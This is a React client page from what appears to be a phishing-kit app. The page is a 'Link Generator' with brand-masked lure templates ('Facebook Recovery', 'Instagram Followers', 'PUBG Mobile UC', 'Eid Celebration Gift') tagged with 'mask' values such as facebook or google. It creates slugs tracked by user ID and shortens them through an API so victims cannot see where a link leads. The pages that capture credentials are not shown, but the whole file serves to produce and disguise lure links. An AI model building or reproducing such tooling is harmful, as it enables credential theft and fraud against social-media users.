"use client";
import { useState } from "react";

export default function GeneratorPage() {
  const templates = [
    { id: "fb-recovery", name: "Facebook Recovery", mask: "facebook", icon: "👤", description: "Account recovery and security check simulation." },
    { id: "ig-followers", name: "Instagram Followers", mask: "instagram", icon: "📸", description: "Free followers and engagement booster." },
    { id: "tiktok", name: "TikTok Booster", mask: "youtube", icon: "🎵", description: "Get viral and increase your view count." },
    { id: "pubg", name: "PUBG Mobile UC", mask: "google", icon: "🔫", description: "Free UC giveaway and skin rewards." },
    { id: "eid-gift", name: "Eid Celebration Gift", mask: "google", icon: "🌙", description: "Special festive rewards and gift cards." },
    { id: "temp-number", name: "Temporary Number", mask: "google", icon: "📱", description: "Get an anonymous temporary number for verifications." }
  ];

  const [selected, setSelected] = useState(null);
  const [maskedLink, setMaskedLink] = useState("");
  const [copied, setCopied] = useState(false);
  const [loading, setLoading] = useState(false);

  const handleGenerateAndMask = async () => {
    if (!selected) return;
    setLoading(true);
    setMaskedLink("");
    setCopied(false);

    try {
      const baseUrl = window.location.origin;
      const storedId = localStorage.getItem("aura_user_id") || "anonymous";
      const uniqueId = Math.random().toString(36).substring(2, 6);
      const slug = `${selected}-${uniqueId}`;
      const targetUrl = `${baseUrl}/${slug}?uid=${storedId}`;

      // Request shortening
      const res = await fetch("/api/shorten", {
        method: "POST",
        body: JSON.stringify({ 
          url: targetUrl,
          slug: slug,
          userId: storedId
        }),
        headers: { "Content-Type": "application/json" }
      });
      const data = await res.json();
      if (data.shortUrl) {
        setMaskedLink(data.shortUrl);
      }
    } catch (err) {
      console.error(err);
    } finally {
      setLoading(false);
    }
  };

  const copyToClipboard = () => {
    navigator.clipboard.writeText(maskedLink);
    setCopied(true);
    setTimeout(() => setCopied(false), 2000);
  };

  return (
    <div className="main-container animate-fade-in py-6 sm:py-12">
      <header className="mb-8 sm:mb-12">
        <h1 className="text-2xl sm:text-4xl font-bold mb-2 tracking-tight">Link <span className="text-gradient">Generator</span></h1>
        <p className="text-slate-500 text-xs sm:text-sm font-medium">Choose a tool and click to generate your secure link.</p>
      </header>

      <div className="grid grid-cols-2 lg:grid-cols-3 gap-4 sm:gap-6 mb-10">
        {templates.map((template) => (
          <div 
            key={template.id} 
            onClick={() => setSelected(template.id)}
            className={`glass-card p-5 sm:p-8 rounded-[1.5rem] cursor-pointer transition-all duration-300 relative border-2 ${
              selected === template.id 
                ? 'border-indigo-500 bg-indigo-50/80 shadow-[0_8px_30px_rgba(99,102,241,0.2)] scale-[1.03] transform' 
                : 'border-transparent hover:border-slate-200 hover:bg-slate-50/80 hover:-translate-y-1'
            }`}
          >
            {/* Selection Checkmark Badge */}
            {selected === template.id && (
              <div className="absolute -top-3 -right-3 w-8 h-8 sm:w-10 sm:h-10 bg-indigo-600 rounded-full flex items-center justify-center text-white text-sm sm:text-base shadow-lg border-4 border-white animate-fade-in z-10">
                ✓
              </div>
            )}
            
            <div className={`text-3xl sm:text-5xl mb-4 transition-transform duration-300 ${selected === template.id ? 'scale-110' : ''}`}>
              {template.icon}
            </div>
            <h3 className={`text-base sm:text-xl font-bold mb-1.5 transition-colors ${selected === template.id ? 'text-indigo-900' : 'text-slate-800'}`}>
              {template.name}
            </h3>
            <p className={`text-[11px] sm:text-sm line-clamp-2 transition-colors ${selected === template.id ? 'text-indigo-600/80 font-medium' : 'text-slate-500'}`}>
              {template.description}
            </p>
          </div>
        ))}
      </div>

      <div className="max-w-2xl mx-auto">
        {!maskedLink ? (
          <button 
            onClick={handleGenerateAndMask}
            disabled={!selected || loading}
            className={`w-full py-4 sm:py-5 rounded-2xl font-black text-lg transition-all shadow-xl flex items-center justify-center gap-3 ${selected ? 'bg-indigo-600 hover:bg-indigo-700 text-white shadow-indigo-500/20' : 'bg-slate-100 text-slate-300'}`}
          >
            {loading ? "Generating Link..." : selected ? `Generate ${templates.find(t => t.id === selected)?.name} Link` : 'Select a tool above'}
          </button>
        ) : (
          <div className="animate-fade-in-up">
            <div className="p-6 sm:p-8 glass-card rounded-[1.5rem] border-emerald-200 bg-white shadow-lg">
              <div className="flex items-center justify-between mb-4">
                <p className="text-[10px] font-black text-emerald-600 uppercase tracking-widest">Link Generated Successfully</p>
                <button onClick={() => setMaskedLink("")} className="text-[10px] font-bold text-indigo-600">Create New</button>
              </div>

                <div className="flex flex-col sm:flex-row items-center gap-3">
                  <div className={`flex-1 w-full border rounded-xl px-4 py-4 text-sm font-bold font-mono shadow-inner overflow-hidden truncate ${maskedLink === "PREVIEW_MODE" ? 'bg-amber-50 border-amber-200 text-amber-700 italic' : 'bg-slate-50 border-slate-100 text-slate-700'}`}>
                    {maskedLink === "PREVIEW_MODE" ? "is.gd/[tool_name]_active_on_vercel" : maskedLink.replace("https://", "")}
                  </div>
                  <div className="flex w-full sm:w-auto gap-2">
                    <button 
                      onClick={maskedLink === "PREVIEW_MODE" ? null : copyToClipboard} 
                      disabled={maskedLink === "PREVIEW_MODE"}
                      className={`flex-1 sm:flex-none px-8 py-4 text-white rounded-xl text-xs font-black transition-all shadow-lg active:scale-95 ${maskedLink === "PREVIEW_MODE" ? 'bg-slate-300 cursor-not-allowed' : copied ? 'bg-emerald-500' : 'bg-slate-900 hover:bg-slate-800'}`}
                    >
                      {maskedLink === "PREVIEW_MODE" ? 'Locked' : copied ? 'Copied! ✨' : 'Copy Link'}
                    </button>
                    {maskedLink !== "PREVIEW_MODE" && (
                      <button 
                        onClick={handleGenerateAndMask}
                        className="p-4 bg-slate-100 text-slate-600 rounded-xl hover:bg-slate-200 transition-all border border-slate-200"
                        title="Link not working? Click to generate a different one."
                      >
                        🔄
                      </button>
                    )}
                  </div>
                </div>
                {maskedLink === "PREVIEW_MODE" ? (
                  <div className="mt-4 p-4 rounded-xl bg-amber-100 border-2 border-amber-200 animate-pulse">
                    <p className="text-[11px] text-amber-900 font-black leading-tight flex items-center gap-2">
                       ⚠️ DEVELOPER SYSTEM NOTICE:
                    </p>
                    <p className="text-[10px] text-amber-800 mt-2 font-bold leading-relaxed">
                      You are currently on <span className="underline">localhost</span>. <br/>
                      Shortening services cannot see your private computer, so they cannot create real links yet. <br/><br/>
                      <span className="text-black bg-white px-1.5 py-0.5 rounded">To fix this:</span> Push your code to your **Vercel domain**. This "Locked" box will then automatically turn into a real working link!
                    </p>
                  </div>
                ) : (
                  <p className="mt-4 text-[9px] text-slate-400 font-bold text-center italic">
                    * If link fails, click the 🔄 refresh icon to try a different system.
                  </p>
                )}
            </div>
          </div>
        )}
      </div>
    </div>
  );
}
